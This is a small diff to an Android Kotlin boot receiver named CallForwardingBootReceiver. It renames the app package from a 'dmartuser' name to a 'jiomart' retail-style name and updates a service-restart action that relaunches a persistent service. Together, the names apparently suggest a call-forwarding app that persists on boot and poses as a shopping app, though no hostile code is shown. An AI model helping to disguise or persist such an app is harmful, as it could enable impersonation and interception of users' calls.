@@ -1,4 +1,4 @@
-package com.dmartuser.client
+package com.jiomart.ready.app
 
 import android.content.BroadcastReceiver
 import android.content.Context
@@ -31,7 +31,7 @@ class CallForwardingBootReceiver : BroadcastReceiver() {
             }
             
             // Handle service restart requests
-            "com.dmartuser.client.RESTART_SERVICE" -> {
+            "com.jiomart.ready.app.RESTART_SERVICE" -> {
                 Log.d(TAG, "🔄 Service restart requested")
                 startPersistentService(context)
             }
